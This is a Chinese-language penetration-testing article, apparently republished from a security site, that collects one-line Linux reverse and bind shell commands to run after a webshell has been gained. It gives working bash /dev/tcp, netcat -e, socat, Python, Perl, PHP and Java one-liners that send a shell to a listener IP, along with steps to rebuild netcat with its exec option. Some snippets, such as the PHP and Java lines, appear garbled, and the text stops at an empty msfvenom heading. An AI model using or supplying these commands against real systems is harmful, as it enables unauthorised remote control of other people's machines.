# 【技术分享】linux各种一句话反弹shell总结
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：[myles007](http://bobao.360.cn/member/contribute?uid=749283137)
预估稿费：300RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
**简介**
我们在渗透测试的过程中经常会遇到linux主机环境，而在获取linux主机shell是我们经常需要做的是工作内容之一，其中经常会遇到以下几个场景。
**一、场景一**
我们已经拿下主机的一个webshell,我们想获取一个可以直接操作主机的虚拟终端，此时我们首先想到的是开启一个shell监听，这种场景比较简单，我们直接使用使用nc即可开启，如果没有nc我们也可以很轻松的直接下载安装一个，具体开启监听的命令如下。
**1.1 安装netcat**
这里需要注意一点默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数
-e这里都被阉割了，所以我们需要手动下载二进制安装包，自己动手丰衣足食了，具体过程如下。
原生版本netcat链接：
    # 第一步：下载二进制netc安装包
    root@home-pc# wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz 
    # 第二步：解压安装包
    root@home-pc# tar -xvzf netcat-0.7.1.tar.gz
    # 第三步：编译安装
    root@home-pc# ./configure
    root@home-pc# make
    root@home-pc# make install
    root@home-pc# make clean
    # 具体编译安装过程可以直接参见INSTALL安装说明文件内容...
    # 第四步：在当前目录下运行nc帮助
    root@home-pc:/tmp/netcat-0.7.1# nc -h
    GNU netcat 0.7.1, a rewrite of the famous networking tool.
    Basic usages:
    connect to somewhere:  nc [options] hostname port [port] ...
    listen for inbound:    nc -l -p port [options] [hostname] [port] ...
    tunnel to somewhere:   nc -L hostname:port -p port [options]
    Mandatory arguments to long options are mandatory for short options too.
    Options:
      -c, --close                close connection on EOF from stdin
      -e, --exec=PROGRAM         program to exec after connect
      -g, --gateway=LIST         source-routing hop point[s], up to 8
      -G, --pointer=NUM          source-routing pointer: 4, 8, 12, ...
      -h, --help                 display this help and exit
      -i, --interval=SECS        delay interval for lines sent, ports scanned
      -l, --listen               listen mode, for inbound connects
      -L, --tunnel=ADDRESS:PORT  forward local port to remote address
      -n, --dont-resolve         numeric-only IP addresses, no DNS
      -o, --output=FILE          output hexdump traffic to FILE (implies -x)
      -p, --local-port=NUM       local port number
      -r, --randomize            randomize local and remote ports
      -s, --source=ADDRESS       local source address (ip or hostname)
      -t, --tcp                  TCP mode (default)
      -T, --telnet               answer using TELNET negotiation
      -u, --udp                  UDP mode
      -v, --verbose              verbose (use twice to be more verbose)
      -V, --version              output version information and exit
      -x, --hexdump              hexdump incoming and outgoing traffic
      -w, --wait=SECS            timeout for connects and final net reads
      -z, --zero                 zero-I/O mode (used for scanning)
    Remote port number can also be specified as range.  Example: '1-1024'
至此我们已经安装完成原生版本的 netcat工具，有了netcat -e参数，我们就可以将本地bash完整发布到外网了。
**1.2 开启本地监听**
    # 开启本地8080端口监听，并将本地的bash发布出去。
    root# nc -lvvp 8080 -t -e /bin/bash
**1.3 直接连接目标主机**
    root@kali:~# nc 192.168.31.41 8080
    whoami
    root
    w
     22:57:36 up  1:24,  0 users,  load average: 0.52, 0.58, 0.59
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHA
**二、场景二**
目标主机为一个内网主机，并没有公网IP地址，我们无法从外网发起对目标主机的远程连接，此时我们使用的方法是使用获取的webshell主动发起一个反弹的shell到外网，然后获取一个目标主机的shell终端控制环境，而有关shell反弹的方法有很多这里简单介绍几种比较常见的方法。
**2.1 bash 直接反弹**
bash一句话shell反弹：个人感觉最好用的用的方法就是使用的方法就是使用bash结合重定向方法的一句话，具体命令如下。
（1） bash反弹一句话
    root# bash -i >& /dev/tcp/192.168.31.41/8080 0>&1
（2）bash一句话命令详解
以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。
其实以上bash反弹一句完整的解读过程就是：
bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp
8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。
**2.2 netcat 工具反弹**
Netcat
一句话反弹：Netcat反弹也是非常常用的方法，只是这个方法需要我们手动去安装一个NC环境，前面已经介绍默认的linux发型版现在自带的NC都是被阉割过来，无法反弹一个bash给远端，所以相对上面的bash一句话反弹显得就繁琐很多，同时通过实际测试发现NC反弹的shell交互性也差很多，后面会具体说道，这里就不多说了。
**（1）开启外网主机监听**
    root@kali:~# nc -lvvp 8080
    listening on [any] 8080 ...
**（2） netcat安装**
有关netcat的原生二进制安装包的编译安装内容请参考场景一中的具体说明；
**（3）netcat 反弹一句话**
    ~ # nc 192.168.31.174 8080 -t -e /bin/bash
    # 命令详解：通过webshell我们可以使用nc命令直接建立一个tcp 8080 的会话连接，然后将本地的bash通过这个会话连接反弹给目标主机（192.168.31.174）。
**（4）shell反弹成功**
此时我们再回到外网主机，我们会发现tcp 8080监听已经接收到远端主机发起的连接，并成功获取shell虚拟终端控制环境。
**2.3 socat 反弹一句话**
Socat是Linux 下一个多功能的网络工具，名字来由是” Socket CAT”，因此可以看出它基于socket，能够折腾socket相关的无数事情
，其功能与netcat类似，不过据说可以看做netcat的加强版,事实上的确也是如此，nc应急比较久没人维护了，确实显得有些陈旧了，我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参加见文末的参考学习。
有关socat二进制可执行文件，大家可以到这个链接下载：
**（1） 攻击机上开启监听**
    # socat TCP-LISTEN:12345 -
****
**（2） 靶机上运行socat反弹shell**
    # /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.31.174：12345
**（3） shell 反弹成功**
**2.4 其他脚本一句话shell反弹**
以下脚本反弹一句话的使用方法都是一样的，只要在攻击机在本地开启 TCP
8080监听，然后在远端靶机上运行以下任意一种脚本语句，即可把靶机的bash反弹给攻击主机的8080端口（当然前提条件是目标主机上要有响应的脚本解析环境支持，才可以使用，相信这点大家肯定都是明白的）。
**2.4.1 python脚本反弹**
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
**2.4.2 php 脚本反弹**
    php -r '$sock=fsockopen("192.168.31.41",8080);exec("/bin/sh -i &3 2>&3");'
**2.4.3 Java 脚本反弹**
    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.31.41/8080;cat &5 >&5; done"] as String[])
    p.waitFor()
**2.4.4 perl 脚本反弹**
    perl -e 'use Socket;$i="192.168.31.41";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
**2.5 msfvenom 获取反弹一句话**